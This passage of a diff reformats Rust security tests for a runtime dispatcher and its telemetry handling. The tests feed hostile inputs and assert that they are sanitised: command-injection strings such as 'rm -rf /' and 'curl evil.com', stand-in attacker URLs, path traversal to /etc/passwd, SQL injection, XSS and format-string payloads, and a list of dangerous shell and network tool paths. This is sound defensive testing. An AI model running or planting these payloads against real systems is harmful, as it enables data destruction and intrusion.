+                            String::from_utf8_lossy(&malicious_stdout[..10000]).to_string()
+                        } else {
+                            String::from_utf8_lossy(malicious_stdout).to_string()
+                        };
 
-                    let truncated_stderr = if malicious_stderr.len() > 10000 {
-                        String::from_utf8_lossy(&malicious_stderr[..10000]).to_string()
-                    } else {
-                        String::from_utf8_lossy(malicious_stderr).to_string()
-                    };
+                        let truncated_stderr = if malicious_stderr.len() > 10000 {
+                            String::from_utf8_lossy(&malicious_stderr[..10000]).to_string()
+                        } else {
+                            String::from_utf8_lossy(malicious_stderr).to_string()
+                        };
 
-                    let truncated_output = CapturedProcessOutput {
-                        stdout: truncated_stdout,
-                        stderr: truncated_stderr,
-                    };
+                        let truncated_output = CapturedProcessOutput {
+                            stdout: truncated_stdout,
+                            stderr: truncated_stderr,
+                        };
 
-                    // Verify truncated output is manageable
-                    assert!(truncated_output.stdout.len() <= 10000,
-                        "Attack {}: Truncated stdout should be within limits", attack_idx);
-                    assert!(truncated_output.stderr.len() <= 10000,
-                        "Attack {}: Truncated stderr should be within limits", attack_idx);
+                        // Verify truncated output is manageable
+                        assert!(
+                            truncated_output.stdout.len() <= 10000,
+                            "Attack {}: Truncated stdout should be within limits",
+                            attack_idx
+                        );
+                        assert!(
+                            truncated_output.stderr.len() <= 10000,
+                            "Attack {}: Truncated stderr should be within limits",
+                            attack_idx
+                        );
 
-                    // Test serialization of truncated output
-                    let truncated_json = serde_json::to_string(&truncated_output);
-                    assert!(truncated_json.is_ok(),
-                        "Attack {}: Truncated output should serialize successfully", attack_idx);
-                }));
+                        // Test serialization of truncated output
+                        let truncated_json = serde_json::to_string(&truncated_output);
+                        assert!(
+                            truncated_json.is_ok(),
+                            "Attack {}: Truncated output should serialize successfully",
+                            attack_idx
+                        );
+                    }));
 
                 if truncation_test.is_err() {
-                    println!("Output truncation test {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Output truncation test {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
         }
 
-        println!("Process output injection test completed: {} attack vectors tested", malicious_outputs.len());
+        println!(
+            "Process output injection test completed: {} attack vectors tested",
+            malicious_outputs.len()
+        );
     }
 
     #[test]
@@ -2357,7 +2594,6 @@ mod tests {
             ("/usr/bin/python3", "Interpreter execution"),
             ("/usr/bin/perl", "Script interpreter execution"),
             ("/bin/bash", "Shell interpreter execution"),
-
             // Command injection in runtime names
             ("node; rm -rf /", "Command injection in runtime name"),
             ("python && curl evil.com", "Command chaining in runtime"),
@@ -2366,47 +2602,48 @@ mod tests {
             ("bun $(whoami)", "Command substitution in runtime"),
             ("node `id`", "Backtick substitution in runtime"),
             ("npm ${PATH}", "Environment variable injection"),
-
             // Path traversal in runtime resolution
             ("../../../bin/sh", "Path traversal to shell"),
             ("../../../../usr/bin/curl", "Deep path traversal"),
-            ("../../usr/local/bin/malicious", "Relative path manipulation"),
+            (
+                "../../usr/local/bin/malicious",
+                "Relative path manipulation",
+            ),
             ("./../../../../bin/bash", "Current directory traversal"),
-
             // Symbolic link exploitation
             ("/tmp/evil_symlink", "Symbolic link to malicious binary"),
             ("/var/tmp/../../../bin/sh", "Symlink traversal"),
             ("/proc/self/exe", "Process self-execution"),
-
             // Device file exploitation
             ("/dev/null", "Null device exploitation"),
             ("/dev/zero", "Zero device exploitation"),
             ("/dev/random", "Random device exploitation"),
             ("/dev/stdin", "Stdin device exploitation"),
-
             // Network-based runtime confusion
             ("http://evil.com/runtime", "HTTP-based runtime"),
             ("ftp://attacker.com/malicious", "FTP-based runtime"),
             ("//evil.com/shared/runtime", "UNC path runtime"),
-
             // Control character confusion
             ("node\x00/bin/sh", "Null byte runtime confusion"),
             ("python\r\necho hacked", "CRLF runtime injection"),
             ("ruby\x1B[31mcolored", "ANSI escape runtime"),
-
             // Unicode runtime confusion
             ("node\u{202E}edoN", "Bidirectional override runtime"),
             ("python\u{200B}hidden", "Zero-width space runtime"),
             ("ruby\u{FEFF}bom", "BOM runtime confusion"),
-
             // Environment variable runtime confusion
             ("${SHELL}", "Shell environment variable"),
             ("$HOME/malicious", "Home directory runtime"),
             ("$(echo /bin/sh)", "Command substitution runtime"),
         ];
 
-        for (attack_idx, (malicious_runtime, attack_description)) in runtime_confusion_attacks.iter().enumerate() {
-            println!("Testing runtime confusion attack {}: {}", attack_idx, attack_description);
+        for (attack_idx, (malicious_runtime, attack_description)) in
+            runtime_confusion_attacks.iter().enumerate()
+        {
+            println!(
+                "Testing runtime confusion attack {}: {}",
+                attack_idx, attack_description
+            );
 
             let confusion_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                 // Create malicious config with confused runtime
@@ -2429,30 +2666,51 @@ mod tests {
 
                 // Verify runtime path sanitization
                 let runtime_str = fallback_plan.runtime_path.to_string_lossy();
-                assert!(!runtime_str.contains('\0'),
-                    "Attack {}: Runtime path should not contain null bytes", attack_idx);
+                assert!(
+                    !runtime_str.contains('\0'),
+                    "Attack {}: Runtime path should not contain null bytes",
+                    attack_idx
+                );
 
                 // Verify no obvious command injection
-                assert!(!fallback_plan.runtime.contains(';'),
-                    "Attack {}: Runtime name should not contain command separators", attack_idx);
-                assert!(!fallback_plan.runtime.contains('&'),
-                    "Attack {}: Runtime name should not contain command chaining", attack_idx);
-                assert!(!fallback_plan.runtime.contains('|'),
-                    "Attack {}: Runtime name should not contain pipes", attack_idx);
+                assert!(
+                    !fallback_plan.runtime.contains(';'),
+                    "Attack {}: Runtime name should not contain command separators",
+                    attack_idx
+                );
+                assert!(
+                    !fallback_plan.runtime.contains('&'),
+                    "Attack {}: Runtime name should not contain command chaining",
+                    attack_idx
+                );
+                assert!(
+                    !fallback_plan.runtime.contains('|'),
+                    "Attack {}: Runtime name should not contain pipes",
+                    attack_idx
+                );
 
                 // Verify no command substitution
-                assert!(!fallback_plan.runtime.contains("$("),
-                    "Attack {}: Runtime name should not contain command substitution", attack_idx);
-                assert!(!fallback_plan.runtime.contains("`"),
-                    "Attack {}: Runtime name should not contain backtick substitution", attack_idx);
-                assert!(!fallback_plan.runtime.contains("${"),
-                    "Attack {}: Runtime name should not contain variable expansion", attack_idx);
+                assert!(
+                    !fallback_plan.runtime.contains("$("),
+                    "Attack {}: Runtime name should not contain command substitution",
+                    attack_idx
+                );
+                assert!(
+                    !fallback_plan.runtime.contains("`"),
+                    "Attack {}: Runtime name should not contain backtick substitution",
+                    attack_idx
+                );
+                assert!(
+                    !fallback_plan.runtime.contains("${"),
+                    "Attack {}: Runtime name should not contain variable expansion",
+                    attack_idx
+                );
 
                 // Test runtime resolution with confusion
                 let resolution_result = dispatcher.resolve_runtime_internal(
                     &config,
                     Some(malicious_runtime), // env_override with malicious runtime
-                    None, // cli_path
+                    None,                    // cli_path
                 );
 
                 match resolution_result {
@@ -2460,25 +2718,40 @@ mod tests {
                         match plan {
                             DispatchPlan::FrankenEngine { ref binary } => {
                                 // If FrankenEngine plan, verify binary safety
-                                assert!(!binary.contains(';'),
-                                    "Attack {}: Engine binary should not contain command injection", attack_idx);
-                                assert!(!binary.contains('\0'),
-                                    "Attack {}: Engine binary should not contain null bytes", attack_idx);
-                            },
+                                assert!(
+                                    !binary.contains(';'),
+                                    "Attack {}: Engine binary should not contain command injection",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('\0'),
+                                    "Attack {}: Engine binary should not contain null bytes",
+                                    attack_idx
+                                );
+                            }
                             DispatchPlan::RuntimeFallback(ref plan) => {
                                 // Verify fallback plan safety
-                                assert!(!plan.runtime.contains(';'),
-                                    "Attack {}: Fallback runtime should not contain command injection", attack_idx);
-                                assert!(!plan.runtime.contains('\0'),
-                                    "Attack {}: Fallback runtime should not contain null bytes", attack_idx);
+                                assert!(
+                                    !plan.runtime.contains(';'),
+                                    "Attack {}: Fallback runtime should not contain command injection",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !plan.runtime.contains('\0'),
+                                    "Attack {}: Fallback runtime should not contain null bytes",
+                                    attack_idx
+                                );
 
                                 // Verify runtime path doesn't escape to dangerous locations
                                 let runtime_path_str = plan.runtime_path.to_string_lossy();
-                                let dangerous_paths = ["/bin/sh", "/bin/bash", "/usr/bin/curl", "/usr/bin/wget"];
+                                let dangerous_paths =
+                                    ["/bin/sh", "/bin/bash", "/usr/bin/curl", "/usr/bin/wget"];
                                 for dangerous_path in &dangerous_paths {
                                     if runtime_path_str == *dangerous_path {
-                                        println!("WARNING: Attack {}: Dangerous runtime path detected: {}",
-                                            attack_idx, dangerous_path);
+                                        println!(
+                                            "WARNING: Attack {}: Dangerous runtime path detected: {}",
+                                            attack_idx, dangerous_path
+                                        );
                                     }
                                 }
 
@@ -2486,23 +2759,32 @@ mod tests {
                                 match plan.mode {
                                     RuntimeExecutionMode::FallbackFrankenEngineUnavailable => {
                                         // This is expected for fallback scenarios
-                                    },
+                                    }
                                     RuntimeExecutionMode::Explicit => {
                                         // Explicit execution should be carefully validated
-                                        assert!(!runtime_path_str.contains("../"),
-                                            "Attack {}: Explicit runtime should not contain path traversal", attack_idx);
+                                        assert!(
+                                            !runtime_path_str.contains("../"),
+                                            "Attack {}: Explicit runtime should not contain path traversal",
+                                            attack_idx
+                                        );
                                     }
                                 }
                             }
                         }
-                    },
+                    }
                     Err(e) => {
                         // Expected behavior for many malicious runtimes
                         let error_msg = e.to_string();
-                        assert!(!error_msg.contains('\0'),
-                            "Attack {}: Error message should not contain null bytes", attack_idx);
-                        assert!(!error_msg.contains(';'),
-                            "Attack {}: Error message should not contain command injection", attack_idx);
+                        assert!(
+                            !error_msg.contains('\0'),
+                            "Attack {}: Error message should not contain null bytes",
+                            attack_idx
+                        );
+                        assert!(
+                            !error_msg.contains(';'),
+                            "Attack {}: Error message should not contain command injection",
+                            attack_idx
+                        );
                     }
                 }
 
@@ -2514,15 +2796,24 @@ mod tests {
                 let malicious_plan = DispatchPlan::RuntimeFallback(fallback_plan.clone());
 
                 // Plans should not be equal if they're different
-                assert_ne!(legitimate_plan, malicious_plan,
-                    "Attack {}: Different plans should not be equal", attack_idx);
+                assert_ne!(
+                    legitimate_plan, malicious_plan,
+                    "Attack {}: Different plans should not be equal",
+                    attack_idx
+                );
 
                 // Test plan debugging output safety
                 let plan_debug = format!("{:?}", malicious_plan);
-                assert!(!plan_debug.contains('\0'),
-                    "Attack {}: Plan debug output should not contain null bytes", attack_idx);
-                assert!(!plan_debug.contains("; rm"),
-                    "Attack {}: Plan debug output should not contain obvious command injection", attack_idx);
+                assert!(
+                    !plan_debug.contains('\0'),
+                    "Attack {}: Plan debug output should not contain null bytes",
+                    attack_idx
+                );
+                assert!(
+                    !plan_debug.contains("; rm"),
+                    "Attack {}: Plan debug output should not contain obvious command injection",
+                    attack_idx
+                );
 
                 Ok(())
             }));
@@ -2530,9 +2821,12 @@ mod tests {
             match confusion_result {
                 Ok(_) => {
                     // Test completed successfully
-                },
+                }
                 Err(_) => {
-                    println!("Runtime confusion attack {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Runtime confusion attack {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
 
@@ -2545,20 +2839,20 @@ mod tests {
                 };
 
                 // Test with malicious environment override
-                let env_override_result = dispatcher.resolve_runtime_internal(
-                    &config,
-                    Some(malicious_runtime),
-                    None,
-                );
+                let env_override_result =
+                    dispatcher.resolve_runtime_internal(&config, Some(malicious_runtime), None);
 
                 // Environment overrides should be handled safely
                 match env_override_result {
                     Ok(plan) => {
                         // Verify plan safety regardless of source
                         let plan_debug = format!("{:?}", plan);
-                        assert!(!plan_debug.contains('\0'),
-                            "Attack {}: Environment override plan should be safe", attack_idx);
-                    },
+                        assert!(
+                            !plan_debug.contains('\0'),
+                            "Attack {}: Environment override plan should be safe",
+                            attack_idx
+                        );
+                    }
                     Err(_) => {
                         // Rejection is acceptable for malicious overrides
                     }
@@ -2566,11 +2860,17 @@ mod tests {
             }));
 
             if env_override_test.is_err() {
-                println!("Environment override test {} caused panic (safely caught)", attack_idx);
+                println!(
+                    "Environment override test {} caused panic (safely caught)",
+                    attack_idx
+                );
             }
         }
 
-        println!("Runtime fallback confusion test completed: {} attack vectors tested", runtime_confusion_attacks.len());
+        println!(
+            "Runtime fallback confusion test completed: {} attack vectors tested",
+            runtime_confusion_attacks.len()
+        );
     }
 
     #[test]
@@ -2588,50 +2888,61 @@ mod tests {
             ("telemetry\",\"injected\":\"evil", "JSON field injection"),
             ("telemetry}],\"malicious\":[{", "JSON structure injection"),
             ("telemetry\\\"escaped\\\"", "JSON escape injection"),
-
             // Command injection in telemetry
             ("telemetry; rm -rf /", "Command injection in telemetry"),
-            ("telemetry && curl evil.com", "Command chaining in telemetry"),
+            (
+                "telemetry && curl evil.com",
+                "Command chaining in telemetry",
+            ),
             ("telemetry $(whoami)", "Command substitution in telemetry"),
             ("telemetry `id`", "Backtick substitution in telemetry"),
             ("telemetry ${PATH}", "Environment variable in telemetry"),
-
             // Control character injection
             ("telemetry\x00null", "Null byte in telemetry"),
             ("telemetry\r\nCRLF", "CRLF injection in telemetry"),
             ("telemetry\x1B[31mcolored", "ANSI escape in telemetry"),
             ("telemetry\x08\x09\x0A", "Control characters in telemetry"),
-
             // Unicode attacks in telemetry
-            ("telemetry\u{202E}reversed", "Bidirectional override in telemetry"),
+            (
+                "telemetry\u{202E}reversed",
+                "Bidirectional override in telemetry",
+            ),
             ("telemetry\u{200B}hidden", "Zero-width space in telemetry"),
             ("telemetry\u{FEFF}bom", "BOM injection in telemetry"),
-
             // Path injection in telemetry
-            ("telemetry ../../../etc/passwd", "Path traversal in telemetry"),
+            (
+                "telemetry ../../../etc/passwd",
+                "Path traversal in telemetry",
+            ),
             ("telemetry /proc/self/environ", "Process info in telemetry"),
-
             // SQL injection in telemetry
-            ("telemetry'; DROP TABLE events; --", "SQL injection in telemetry"),
+            (
+                "telemetry'; DROP TABLE events; --",
+                "SQL injection in telemetry",
+            ),
             ("telemetry' OR '1'='1", "SQL condition injection"),
-
             // XML injection in telemetry
-            ("telemetry<script>alert('xss')</script>", "XSS injection in telemetry"),
+            (
+                "telemetry<script>alert('xss')</script>",
+                "XSS injection in telemetry",
+            ),
             ("telemetry<!--malicious-->", "XML comment injection"),
-
             // Format string injection
             ("telemetry %n%s%x%d", "Format string in telemetry"),
-
             // Buffer overflow simulation
             ("A".repeat(100000), "Large telemetry payload"),
-
             // Network injection
             ("telemetry http://evil.com", "HTTP URL in telemetry"),
             ("telemetry ftp://attacker.com", "FTP URL in telemetry"),
         ];
 
-        for (attack_idx, (malicious_data, attack_description)) in telemetry_poison_attacks.iter().enumerate() {
-            println!("Testing telemetry poisoning attack {}: {}", attack_idx, attack_description);
+        for (attack_idx, (malicious_data, attack_description)) in
+            telemetry_poison_attacks.iter().enumerate()
+        {
+            println!(
+                "Testing telemetry poisoning attack {}: {}",
+                attack_idx, attack_description
+            );
 
             let poisoning_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                 // Create malicious telemetry runtime handle
@@ -2652,45 +2963,77 @@ mod tests {
                 };
 
                 // Test report field sanitization
-                assert!(!malicious_report.runtime_id.contains('\0') || malicious_report.runtime_id.is_empty(),
-                    "Attack {}: Runtime ID should handle null bytes safely", attack_idx);
+                assert!(
+                    !malicious_report.runtime_id.contains('\0')
+                        || malicious_report.runtime_id.is_empty(),
+                    "Attack {}: Runtime ID should handle null bytes safely",
+                    attack_idx
+                );
 
                 // Verify length limits
-                assert!(malicious_report.runtime_id.len() <= 1000000,
-                    "Attack {}: Runtime ID should have reasonable length limit", attack_idx);
+                assert!(
+                    malicious_report.runtime_id.len() <= 1000000,
+                    "Attack {}: Runtime ID should have reasonable length limit",
+                    attack_idx
+                );
 
                 // Test JSON serialization of poisoned telemetry
                 let serialize_result = serde_json::to_string(&malicious_report);
                 match serialize_result {
                     Ok(json) => {
                         // Verify no injection in serialized JSON
-                        assert!(!json.contains("\"injected\":"),
-                            "Attack {}: Telemetry JSON should not contain injected fields", attack_idx);
-                        assert!(!json.contains("\"malicious\":"),
-                            "Attack {}: Telemetry JSON should not contain malicious fields", attack_idx);
-                        assert!(!json.contains("rm -rf"),
-                            "Attack {}: Telemetry JSON should not contain command injection", attack_idx);
+                        assert!(
+                            !json.contains("\"injected\":"),
+                            "Attack {}: Telemetry JSON should not contain injected fields",
+                            attack_idx
+                        );
+                        assert!(
+                            !json.contains("\"malicious\":"),
+                            "Attack {}: Telemetry JSON should not contain malicious fields",
+                            attack_idx
+                        );
+                        assert!(
+                            !json.contains("rm -rf"),
+                            "Attack {}: Telemetry JSON should not contain command injection",
+                            attack_idx
+                        );
 
                         // Test JSON parsing back
-                        let parse_result: Result<TelemetryRuntimeReport, _> = serde_json::from_str(&json);
-                        assert!(parse_result.is_ok(),
-                            "Attack {}: Poisoned telemetry JSON should parse back", attack_idx);
+                        let parse_result: Result<TelemetryRuntimeReport, _> =
+                            serde_json::from_str(&json);
+                        assert!(
+                            parse_result.is_ok(),
+                            "Attack {}: Poisoned telemetry JSON should parse back",
+                            attack_idx
+                        );
 
                         if let Ok(parsed_report) = parse_result {
                             // Verify parsed report integrity
-                            assert!(!parsed_report.runtime_id.is_empty() || malicious_data.is_empty(),
-                                "Attack {}: Parsed runtime ID should preserve content", attack_idx);
+                            assert!(
+                                !parsed_report.runtime_id.is_empty() || malicious_data.is_empty(),
+                                "Attack {}: Parsed runtime ID should preserve content",
+                                attack_idx
+                            );
 
                             // Verify no command execution contexts
-                            assert!(!parsed_report.runtime_id.contains(";"),
-                                "Attack {}: Parsed runtime ID should not contain command separators", attack_idx);
+                            assert!(
+                                !parsed_report.runtime_id.contains(";"),
+                                "Attack {}: Parsed runtime ID should not contain command separators",
+                                attack_idx
+                            );
                         }
-                    },
+                    }
                     Err(e) => {
-                        println!("Attack {}: Telemetry serialization failed safely: {}", attack_idx, e);
+                        println!(
+                            "Attack {}: Telemetry serialization failed safely: {}",
+                            attack_idx, e
+                        );
                         let error_msg = e.to_string();
-                        assert!(!error_msg.contains('\0'),
-                            "Attack {}: Telemetry error should not contain null bytes", attack_idx);
+                        assert!(
+                            !error_msg.contains('\0'),
+                            "Attack {}: Telemetry error should not contain null bytes",
+                            attack_idx
+                        );
                     }
                 }
 
@@ -2721,42 +3064,67 @@ mod tests {
                 match report_serialize_result {
                     Ok(report_json) => {
                         // Verify dispatch report JSON safety
-                        assert!(!report_json.contains("\"injected\":"),
-                            "Attack {}: Dispatch report should not contain injected fields", attack_idx);
-                        assert!(!report_json.contains("rm -rf"),
-                            "Attack {}: Dispatch report should not contain command injection", attack_idx);
+                        assert!(
+                            !report_json.contains("\"injected\":"),
+                            "Attack {}: Dispatch report should not contain injected fields",
+                            attack_idx
+                        );
+                        assert!(
+                            !report_json.contains("rm -rf"),
+                            "Attack {}: Dispatch report should not contain command injection",
+                            attack_idx
+                        );
 
                         // Test dispatch report parsing
-                        let report_parse_result: Result<RunDispatchReport, _> = serde_json::from_str(&report_json);
-                        assert!(report_parse_result.is_ok(),
-                            "Attack {}: Dispatch report should parse back correctly", attack_idx);
-                    },
+                        let report_parse_result: Result<RunDispatchReport, _> =
+                            serde_json::from_str(&report_json);
+                        assert!(
+                            report_parse_result.is_ok(),
+                            "Attack {}: Dispatch report should parse back correctly",
+                            attack_idx
+                        );
+                    }
                     Err(e) => {
-                        println!("Attack {}: Dispatch report serialization failed safely: {}", attack_idx, e);
+                        println!(
+                            "Attack {}: Dispatch report serialization failed safely: {}",
+                            attack_idx, e
+                        );
                     }
                 }
 
                 // Test telemetry handle shutdown with poisoned data
-                let shutdown_result = runtime_handle.shutdown_signal.send(ShutdownReason::Requested);
+                let shutdown_result = runtime_handle
+                    .shutdown_signal
+                    .send(ShutdownReason::Requested);
                 match shutdown_result {
                     Ok(()) => {
                         // Shutdown signal sent successfully
-                    },
+                    }
                     Err(e) => {
-                        println!("Attack {}: Telemetry shutdown failed safely: {}", attack_idx, e);
+                        println!(
+                            "Attack {}: Telemetry shutdown failed safely: {}",
+                            attack_idx, e
+                        );
                     }
                 }
 
                 // Test telemetry bridge handling of poisoned data
-                let bridge_test_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                    // Test telemetry bridge with malicious data (if it has public methods)
-                    let bridge_debug = format!("{:?}", telemetry_bridge);
-                    assert!(!bridge_debug.contains('\0'),
-                        "Attack {}: Telemetry bridge debug should be safe", attack_idx);
-                }));
+                let bridge_test_result =
+                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                        // Test telemetry bridge with malicious data (if it has public methods)
+                        let bridge_debug = format!("{:?}", telemetry_bridge);
+                        assert!(
+                            !bridge_debug.contains('\0'),
+                            "Attack {}: Telemetry bridge debug should be safe",
+                            attack_idx
+                        );
+                    }));
 
                 if bridge_test_result.is_err() {
-                    println!("Telemetry bridge test {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Telemetry bridge test {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
 
                 Ok(())
@@ -2765,48 +3133,68 @@ mod tests {
             match poisoning_result {
                 Ok(_) => {
                     // Test completed successfully
-                },
+                }
                 Err(_) => {
-                    println!("Telemetry poisoning attack {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Telemetry poisoning attack {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
 
             // Test telemetry event injection
             if malicious_data.len() < 1000 {
-                let event_injection_test = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                    use crate::ops::telemetry_bridge::TelemetryEvent;
+                let event_injection_test =
+                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                        use crate::ops::telemetry_bridge::TelemetryEvent;
 
-                    let malicious_event = TelemetryEvent {
-                        code: malicious_data.clone(),
-                        timestamp: chrono::Utc::now().to_rfc3339(),
-                        reason_code: Some(malicious_data.clone()),
-                        details: Some(format!("details_{}", malicious_data)),
-                    };
+                        let malicious_event = TelemetryEvent {
+                            code: malicious_data.clone(),
+                            timestamp: chrono::Utc::now().to_rfc3339(),
+                            reason_code: Some(malicious_data.clone()),
+                            details: Some(format!("details_{}", malicious_data)),
+                        };
 
-                    // Test event serialization
-                    let event_json = serde_json::to_string(&malicious_event);
-                    match event_json {
-                        Ok(json) => {
-                            assert!(!json.contains("\"injected\":"),
-                                "Attack {}: Event JSON should not contain injected fields", attack_idx);
+                        // Test event serialization
+                        let event_json = serde_json::to_string(&malicious_event);
+                        match event_json {
+                            Ok(json) => {
+                                assert!(
+                                    !json.contains("\"injected\":"),
+                                    "Attack {}: Event JSON should not contain injected fields",
+                                    attack_idx
+                                );
 
-                            let event_parse: Result<TelemetryEvent, _> = serde_json::from_str(&json);
-                            assert!(event_parse.is_ok(),
-                                "Attack {}: Event JSON should parse back", attack_idx);
-                        },
-                        Err(e) => {
-                            println!("Attack {}: Event serialization failed safely: {}", attack_idx, e);
+                                let event_parse: Result<TelemetryEvent, _> =
+                                    serde_json::from_str(&json);
+                                assert!(
+                                    event_parse.is_ok(),
+                                    "Attack {}: Event JSON should parse back",
+                                    attack_idx
+                                );
+                            }
+                            Err(e) => {
+                                println!(
+                                    "Attack {}: Event serialization failed safely: {}",
+                                    attack_idx, e
+                                );
+                            }
                         }
-                    }
-                }));
+                    }));
 
                 if event_injection_test.is_err() {
-                    println!("Telemetry event injection test {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Telemetry event injection test {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
         }
 
-        println!("Telemetry data poisoning test completed: {} attack vectors tested", telemetry_poison_attacks.len());
+        println!(
+            "Telemetry data poisoning test completed: {} attack vectors tested",
+            telemetry_poison_attacks.len()
+        );
     }
 
     #[test]
@@ -2831,22 +3219,21 @@ mod tests {
         let race_scenarios = [
             // Concurrent runtime resolution race
             ("runtime_resolution", 15, "Concurrent runtime resolution"),
-
             // Configuration manipulation race
             ("config_race", 12, "Configuration manipulation race"),
-
             // Output capture race
             ("output_capture", 18, "Process output capture race"),
-
             // Telemetry handling race
             ("telemetry_race", 10, "Telemetry processing race"),
-
             // Mixed operations race
             ("mixed_operations", 20, "Mixed dispatcher operations race"),
         ];
 
         for (race_name, thread_count, description) in race_scenarios.iter() {
-            println!("Testing dispatcher race condition: {} - {}", race_name, description);
+            println!(
+                "Testing dispatcher race condition: {} - {}",
+                race_name, description
+            );
 
             let mut handles = vec![];
 
@@ -2875,27 +3262,35 @@ mod tests {
 
                                 let resolution_result = {
                                     match dispatcher_clone.lock() {
-                                        Ok(dispatcher) => {
-                                            dispatcher.resolve_runtime_internal(
-                                                &config,
-                                                Some(&format!("race_runtime_{}", thread_id)),
-                                                None,
-                                            )
-                                        },
+                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
+                                            &config,
+                                            Some(&format!("race_runtime_{}", thread_id)),
+                                            None,
+                                        ),
                                         Err(_) => {
-                                            thread_results.push((thread_id, attempt, "lock_poison".to_string(), false));
+                                            thread_results.push((
+                                                thread_id,
+                                                attempt,
+                                                "lock_poison".to_string(),
+                                                false,
+                                            ));
                                             continue;
                                         }
                                     }
                                 };
 
                                 let success = resolution_result.is_ok();
-                                thread_results.push((thread_id, attempt, "resolution".to_string(), success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "resolution".to_string(),
+                                    success,
+                                ));
 
                                 // Brief yield to encourage race conditions
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "config_race" => {
                             // Race conditions in configuration handling
                             for attempt in 0..15 {
@@ -2921,34 +3316,44 @@ mod tests {
 
                                 let config_result = {
                                     match dispatcher_clone.lock() {
-                                        Ok(dispatcher) => {
-                                            dispatcher.resolve_runtime_internal(
-                                                config,
-                                                None,
-                                                Some(Path::new(&format!("/test/cli_{}", thread_id))),
-                                            )
-                                        },
+                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
+                                            config,
+                                            None,
+                                            Some(Path::new(&format!("/test/cli_{}", thread_id))),
+                                        ),
                                         Err(_) => {
-                                            thread_results.push((thread_id, attempt, "config_lock_poison".to_string(), false));
+                                            thread_results.push((
+                                                thread_id,
+                                                attempt,
+                                                "config_lock_poison".to_string(),
+                                                false,
+                                            ));
                                             continue;
                                         }
                                     }
                                 };
 
                                 let config_success = config_result.is_ok();
-                                thread_results.push((thread_id, attempt, "config_test".to_string(), config_success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "config_test".to_string(),
+                                    config_success,
+                                ));
 
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "output_capture" => {
                             // Race conditions in output capture processing
                             for attempt in 0..25 {
                                 let mock_outputs = [
                                     Output {
                                         status: std::process::ExitStatus::from_raw(0),
-                                        stdout: format!("stdout_{}_{}", thread_id, attempt).into_bytes(),
-                                        stderr: format!("stderr_{}_{}", thread_id, attempt).into_bytes(),
+                                        stdout: format!("stdout_{}_{}", thread_id, attempt)
+                                            .into_bytes(),
+                                        stderr: format!("stderr_{}_{}", thread_id, attempt)
+                                            .into_bytes(),
                                     },
                                     Output {
                                         status: std::process::ExitStatus::from_raw(1),
@@ -2960,49 +3365,70 @@ mod tests {
                                 let output = &mock_outputs[attempt % mock_outputs.len()];
 
                                 // Test concurrent output capture processing
-                                let capture_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                                    let captured = CapturedProcessOutput {
-                                        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
-                                        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
-                                    };
+                                let capture_result =
+                                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                                        let captured = CapturedProcessOutput {
+                                            stdout: String::from_utf8_lossy(&output.stdout)
+                                                .to_string(),
+                                            stderr: String::from_utf8_lossy(&output.stderr)
+                                                .to_string(),
+                                        };
 
-                                    // Test serialization under concurrent access
-                                    let json_result = serde_json::to_string(&captured);
-                                    json_result.is_ok()
-                                }));
+                                        // Test serialization under concurrent access
+                                        let json_result = serde_json::to_string(&captured);
+                                        json_result.is_ok()
+                                    }));
 
                                 let capture_success = capture_result.unwrap_or(false);
-                                thread_results.push((thread_id, attempt, "output_capture".to_string(), capture_success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "output_capture".to_string(),
+                                    capture_success,
+                                ));
 
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "telemetry_race" => {
                             // Race conditions in telemetry processing
                             for attempt in 0..12 {
-                                let telemetry_test = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                                    let report = TelemetryRuntimeReport {
-                                        runtime_id: format!("race_runtime_{}_{}", thread_id, attempt),
-                                        started_at: chrono::Utc::now().to_rfc3339(),
-                                        shutdown_reason: ShutdownReason::Requested,
-                                        shutdown_started_at: Some(chrono::Utc::now().to_rfc3339()),
-                                        shutdown_completed_at: Some(chrono::Utc::now().to_rfc3339()),
-                                        drain_timeout_secs: 30,
-                                        events_emitted: attempt as u64,
-                                        recent_events: vec![],
-                                    };
+                                let telemetry_test =
+                                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                                        let report = TelemetryRuntimeReport {
+                                            runtime_id: format!(
+                                                "race_runtime_{}_{}",
+                                                thread_id, attempt
+                                            ),
+                                            started_at: chrono::Utc::now().to_rfc3339(),
+                                            shutdown_reason: ShutdownReason::Requested,
+                                            shutdown_started_at: Some(
+                                                chrono::Utc::now().to_rfc3339(),
+                                            ),
+                                            shutdown_completed_at: Some(
+                                                chrono::Utc::now().to_rfc3339(),
+                                            ),
+                                            drain_timeout_secs: 30,
+                                            events_emitted: attempt as u64,
+                                            recent_events: vec![],
+                                        };
 
-                                    // Test concurrent telemetry serialization
-                                    let telemetry_json = serde_json::to_string(&report);
-                                    telemetry_json.is_ok()
-                                }));
+                                        // Test concurrent telemetry serialization
